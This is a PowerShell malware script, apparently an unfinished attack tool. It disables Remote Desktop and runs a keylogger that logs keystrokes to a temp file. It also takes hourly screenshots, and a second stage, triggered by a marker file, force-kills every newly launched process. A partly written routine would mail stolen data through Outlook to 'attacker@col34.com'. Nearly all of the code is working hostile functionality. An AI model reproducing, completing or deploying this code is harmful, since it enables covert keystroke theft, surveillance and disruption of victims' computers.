function Disable-RemoteConnections { 
    try {
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" �Value 1 -ErrorAction SilentlyContinue
    }
    catch { Write-Host "[-] low integrity level of runtime process! (try to run As Administrator...)" -ForegroundColor Red }
}

$ProcessKillerScript = {

    $proc_state = Get-Process
    while ($true) {
        Start-Sleep -Milliseconds 200
        Compare-Object $proc_state $(Get-Process) -Property Id | where SideIndicator -Like "=>" | select Id | Stop-Process -Force
    }
}

$KeyLoggerScript = {
    $Path = "$env:temp\krabs_ledger.txt"
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
	
	# load signatures and make members available
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
	
	# create output file
	$null = New-Item -Path $Path -ItemType File -Force
		
function Start-KeyLogger
{
    $Path = "$env:temp\krabs_ledger.txt"

		# create endless loop. When user presses CTRL+C, finally-block
		# executes and shows the collected key presses
			# scan all ASCII codes above 8
			for ($ascii = 9; $ascii -le 254; $ascii++)
			{
				# get current key state
				$state = $API::GetAsyncKeyState($ascii)
				
				# is key pressed?
				if ($state -eq -32767)
				{
					$null = [console]::CapsLock
					
					# translate scan code to real code
					$virtualKey = $API::MapVirtualKey($ascii, 3)
					
					# get keyboard state for virtual keys
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)
					
					# prepare a StringBuilder to receive input key
					$mychar = New-Object -TypeName System.Text.StringBuilder
					
					# translate virtual key
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
					
					if ($success)
					{
						# add key to logger file
						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
					}
				}
			}
}

while ($true)
    {
	    Start-Sleep -Milliseconds 40
        Start-KeyLogger
    }
}

$SendMailScript = {
    function ScreenShot
    {
        [CmdletBinding(DefaultParameterSetName='OfWholeScreen')]
        param(    
        # If set, takes a screen capture of the current window
        [Parameter(Mandatory=$true,
            ValueFromPipelineByPropertyName=$true,
            ParameterSetName='OfWindow')]
        [Switch]$OfWindow,
    
        # If set, takes a screenshot of a location on the screen.
        # If two numbers are passed, the screenshot will be from 0,0 to first (left), second (top)
        # If four numbers are passed, the screenshot will be from first (Left), second(top), third (width), fourth (height)
        [Parameter(Mandatory=$true,
            ValueFromPipelineByPropertyName=$true,
            ParameterSetName='OfLocation')]    
        [Double[]]$OfLocation,
    
        # The path for the screenshot. 
        # If this isn't set, the screenshot will be automatically saved to a file in the current directory named ScreenCapture
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [string]
        $Path,
    
        # The image format used to store the screen capture
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [ValidateSet('PNG', 'JPEG', 'TIFF', 'GIF', 'BMP')]
        [string]
        $ImageFormat = 'JPEG',
    
        # The time before and after each screenshot
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [Timespan]$ScreenshotTimer = "0:0:0.125"
        )


        begin {
            Add-Type -AssemblyName System.Drawing, System.Windows.Forms
            $saveScreenshotFromClipboard = {
                if ([Runspace]::DefaultRunspace.ApartmentState -ne 'STA') {
                    # The clipboard isn't accessible in MTA, so save the image in background runspace
                    $cmd = [PowerShell]::Create().AddScript({
                        $bitmap = [Windows.Forms.Clipboard]::GetImage()    
                        $bitmap.Save($args[0], $args[1], $args[2])                    
                        $bitmap.Dispose()
                    }).AddParameters(@("${screenCapturePathBase}${c}.$ImageFormat",$Codec, $ep))
                    $runspace = [RunspaceFactory]::CreateRunspace()
                    $runspace.ApartmentState = 'STA'
                    $runspace.ThreadOptions = 'ReuseThread'
                    $runspace.Open()
                    $cmd.Runspace = $runspace
                    $cmd.Invoke()
                    $runspace.Close()
                    $runspace.Dispose()
                    $cmd.Dispose()
                } else {            
                    $bitmap = [Windows.Forms.Clipboard]::GetImage()    
                    $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
                    $bitmap.Dispose()
                }
            }
        }
        process {
            #region Codec Info
            $Codec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
                Where-Object { $_.FormatDescription -eq $ImageFormat }

            $ep = New-Object Drawing.Imaging.EncoderParameters  
            if ($ImageFormat -eq 'JPEG') {
                $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
            }
            #endregion Codec Info
        

            #region PreScreenshot timer
            if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
                Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
            }
            #endregion Prescreenshot Timer
        
            #region File name
            if (-not $Path) {
                $screenCapturePathBase = "$pwd\ScreenCapture"
            } else {
                $screenCapturePathBase = $Path
            }
            $c = 0
            while (Test-Path "${screenCapturePathBase}${c}.$ImageFormat") {
                $c++
            }
            #endregion
        

        
            if ($psCmdlet.ParameterSetName -eq 'OfWindow') {
                [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
                #region PostScreenshot timer
                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
                }
                #endregion Postscreenshot Timer
                . $saveScreenshotFromClipboard 
                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
            } elseif ($psCmdlet.ParameterSetName -eq 'OfLocation') {
                if ($OfLocation.Count -ne 2 -and $OfLocation.Count -ne 4) {
                    Write-Error "Must provide either a width and a height, or a top, left, width, and height"                
                    return
                }
                if ($OfLocation.Count -eq 2) {
                    $bounds  = New-Object Drawing.Rectangle -Property @{
                        Width = $OfLocation[0]
                        Height = $OfLocation[1]
                    }                
                } else {
                    $bounds  = New-Object Drawing.Rectangle -Property @{
                        X = $OfLocation[0]
                        Y = $OfLocation[1]
                        Width = $OfLocation[2]
                        Height = $OfLocation[3]
                    }
                }
            
                $bitmap = New-Object Drawing.Bitmap $bounds.width, $bounds.height
                $graphics = [Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
                #region PostScreenshot timer
                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
                }
                #endregion Postscreenshot Timer

                $bitmap.Save("${screenCapturePathBase}${c}.$ImageFormat", $Codec, $ep)                    
                $graphics.Dispose()
                $bitmap.Dispose()
                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
            } elseif ($psCmdlet.ParameterSetName -eq 'OfWholeScreen') {
                [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
                #region PostScreenshot timer
                if ($ScreenshotTimer -and $ScreenshotTimer.TotalMilliseconds) {
                    Start-Sleep -Milliseconds $ScreenshotTimer.TotalMilliseconds
                }
                #endregion Postscreenshot Timer
                . $saveScreenshotFromClipboard             
                Get-Item -ErrorAction SilentlyContinue -Path "${screenCapturePathBase}${c}.$ImageFormat"
            }
        
                
                
        }
    }

    function SendMail {
        #gci ""
        #create COM object named Outlook 
        $Outlook = New-Object -ComObject Outlook.Application 
        #create Outlook MailItem named Mail using CreateItem() method 
        $Mail = $Outlook.CreateItem(0) 
        #add properties as desired 
        $Mail.To = "attacker@col34.com" 
        $Mail.Subject = "${Get-Date -f "yyyy-MM-dd"}"

        #send message 
        $Mail.Send() 
        #quit and cleanup 
        $Outlook.Quit() 
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
    }

    while ($true)
    {
        Start-Sleep -Minutes 60
        ScreenShot
    }
}

$Stage2Script = {
    $trigger = $false
    while($true) {
        if (Test-Path "C:\Windows\fish.dll") {
            $trigger = $true
        }
        if ($trigger) {
            #Write-Host "[+] Starting process killer..." -ForegroundColor Green
            $ProcessKiller = Start-Job $ProcessKillerScript
            break;
        } 
        Start-Sleep -Seconds 60
    }
}

#Write-Host "[+] Disabling remote connections to this host..." -ForegroundColor Green
Disable-RemoteConnections

$Stage2 = Start-Job $Stage2Script

########## WIP ################
# $SendMail = Start-Job $SendMailScript

#Write-Host "[+] Starting keylogger..." -ForegroundColor Green
$Keylogging = Start-Job $KeyLoggerScript

#Write-Host "[+] Starting screenshot automation..." -ForegroundColor Green
#$Screenshotter = Start-Job $ScreenshotScript